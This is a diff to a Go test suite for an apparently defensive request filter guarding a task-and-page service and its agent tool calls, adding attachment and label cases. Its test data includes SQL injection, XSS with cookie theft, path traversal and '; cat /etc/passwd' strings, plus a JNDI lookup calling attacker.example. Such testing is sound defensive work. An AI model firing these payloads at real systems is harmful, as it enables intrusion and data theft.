@@ -663,6 +663,10 @@ func TestTheTendrilsSetLetsItsClientThrough(t *testing.T) {
 				send(tdGet("/api/v1/spaces/"+g.id()+"/recall?"+url.Values{"title": {title}, "label": {title, "ai"}}.Encode()), "")
 				send(g.tool(false, "list_pages", map[string]any{"space_id": title, "limit": 50}), " (a space by name)")
 				send(g.tool(true, "search_pages", map[string]any{"query": "keys", "space_id": title}), " (a space by name)")
+				send(g.tool(false, "create_label", map[string]any{"space_id": g.id(), "name": title, "color": "moss"}), " (a label)")
+				send(g.tool(true, "update_label", map[string]any{"label_id": g.id(), "name": title}), " (a label)")
+				send(g.tool(false, "update_task", map[string]any{"task_id": g.id(), "version": 2, "labels": []string{title, "ai"}}), " (labels by name)")
+				send(g.tool(true, "list_tasks", map[string]any{"space_id": g.id(), "labels": []string{title}}), " (labels by name)")
 			}
 			for _, text := range tdProse {
 				send(tdBody("PATCH", "/api/v1/tasks/"+g.id(), map[string]any{"notes": text, "version": 3}), "")
@@ -757,6 +761,19 @@ func TestTheTendrilsSetLetsItsClientThrough(t *testing.T) {
 				send(tdBody("POST", "/api/v1/import/tasks", map[string]any{"space_id": h.id(), "source": "todoist", "items": []any{
 					map[string]any{"kind": "task", "title": "x", "notes": text, "children": []any{map[string]any{"kind": "task", "title": "y", "notes": text}}}}}), " (notes)")
 			}
+			// Files an agent attaches: its pages and notes as Markdown, logs,
+			// configurations, and the largest the tool takes.
+			names := []string{"notes.md", "meeting notes.md", "Quarterly plan (final).md", "週末.log", "deploy-2026-11-14.log", "config.yaml",
+				"rows.csv", "payload.json"}
+			files := append(append(append([]string{}, tdAgentPages...), tdAgentText...), tdProse...)
+			files = append(files, "time=2026-11-14T23:40:04Z level=ERROR msg=\"query failed\" err=\"pq: syntax error at or near \\\"FROM\\\"\" sql=\"SELECT id FROM tasks WHERE space_id = $1; DROP TABLE x\"\n",
+				"server:\n  listen: 0.0.0.0:8080\n  command: [\"/bin/sh\", \"-c\", \"exec /usr/local/bin/app --config /etc/app.yaml\"]\n",
+				`{"script": "<script>alert(1)</script>", "where": "1' OR '1'='1", "path": "../../../etc/passwd"}`)
+			for i, text := range files {
+				send(h.tool(i%2 == 0, "add_attachment", map[string]any{"task_id": h.id(), "filename": names[i%len(names)], "content": text}), " (an attachment)")
+			}
+			largest := []rune(strings.Repeat(strings.Join(tdAgentPages, "\n\n")+"\n\n", 1+262144/len(strings.Join(tdAgentPages, "\n\n"))))
+			send(h.tool(false, "add_attachment", map[string]any{"task_id": h.id(), "filename": "dump.log", "content": string(largest[:262144])}), " (256 KB)")
 			if t.Failed() {
 				t.Logf("events:\n%s", events(out))
 			}
@@ -826,6 +843,11 @@ func TestTheTendrilsSetKeepsTheAttacks(t *testing.T) {
 		{1, g.tool(true, "search_tasks", map[string]any{"query": "1' OR '1'='1' --"})},
 		{1, g.tool(false, "list_pages", map[string]any{"space_id": "x' UNION SELECT password FROM users--"})},
 		{1, g.tool(true, "create_page", map[string]any{"space_id": "<img src=x onerror=alert(1)>", "title": "x", "body": "x"})},
+		{1, g.tool(false, "add_attachment", map[string]any{"task_id": task, "filename": "<img src=x onerror=alert(1)>.md", "content": "x"})},
+		{1, g.tool(true, "create_label", map[string]any{"space_id": space, "name": "x' UNION SELECT password FROM users--"})},
+		{1, g.tool(false, "update_task", map[string]any{"task_id": task, "version": 2, "labels": []string{"ai", "<script>alert(1)</script>"}})},
+		{0, g.tool(false, "add_attachment", map[string]any{"task_id": task, "filename": "x.md", "content": "<script>alert(document.cookie)</script>"})},
+		{0, g.tool(true, "add_attachment", map[string]any{"task_id": task, "filename": "x.log", "content": "x' UNION SELECT password FROM users--"})},
 		{1, g.mcp(true, "initialize", map[string]any{"protocolVersion": "2025-06-18", "clientInfo": map[string]any{"name": "<img src=x onerror=alert(1)>"}})},
 		{1, g.mcp(false, "notifications/cancelled", map[string]any{"requestId": 3, "reason": "${jndi:ldap://attacker.example/a}"})},
 		{1, tdBody("POST", api+"/ai/capture/jabber", map[string]any{"text": "Groceries, then <script>alert(1)</script>", "space_ids": []string{space}})},
@@ -912,6 +934,12 @@ func TestTheTendrilsSetKeepsTheAttacks(t *testing.T) {
 		{3, g.tool(false, "get_task", map[string]any{"task_id": "a);(b"})},
 		{3, g.tool(true, "list_tasks", map[string]any{"space_id": space, "parent_id": "a);(b"})},
 		{4, g.mcp(true, "notifications/cancelled", map[string]any{"requestId": "a);(b"})},
+		// A file's content is unread only in a call to add_attachment, by
+		// that method, at that path.
+		{1, g.tool(false, "create_task", map[string]any{"title": "x", "content": "<script>alert(document.cookie)</script>"})},
+		{1, g.mcp(false, "initialize", map[string]any{"name": "add_attachment", "arguments": map[string]any{"content": "<script>alert(document.cookie)</script>"}})},
+		{1, tdBody("POST", api+"/tasks/"+task+"/comments", map[string]any{"jsonrpc": "2.0", "id": 1, "method": "tools/call",
+			"params": map[string]any{"name": "add_attachment", "arguments": map[string]any{"content": "<script>alert(document.cookie)</script>"}}})},
 		{1, g.tool(false, "move_task", map[string]any{"task_id": task, "parent_id": "1' OR '1'='1"})},
 		{3, g.tool(false, "search_tasks", map[string]any{"query": "milk", "kinds": []string{"task", "a);(b"}})},
 		{1, g.tool(false, "update_task", map[string]any{"task_id": task, "version": 2, "due": "2026-10-13' AND SLEEP(5)--"})},
@@ -979,7 +1007,8 @@ func TestTheTendrilsSetKeepsTheAttacks(t *testing.T) {
 		h.tool(false, "update_page", map[string]any{"page_id": task, "version": 2, "body": "; cat /etc/passwd", "body_hash": "0123456789abcdef"}),
 		h.tool(true, "create_task", map[string]any{"title": "x", "notes": "<svg onload=alert(1)>"}))
 	for _, text := range tdAgentPages {
-		unread = append(unread, h.tool(false, "create_page", map[string]any{"space_id": space, "title": "x", "body": text}))
+		unread = append(unread, h.tool(false, "create_page", map[string]any{"space_id": space, "title": "x", "body": text}),
+			h.tool(true, "add_attachment", map[string]any{"task_id": task, "filename": "notes.md", "content": text}))
 	}
 	// The same names elsewhere are read as text.
 	inText = append(inText,
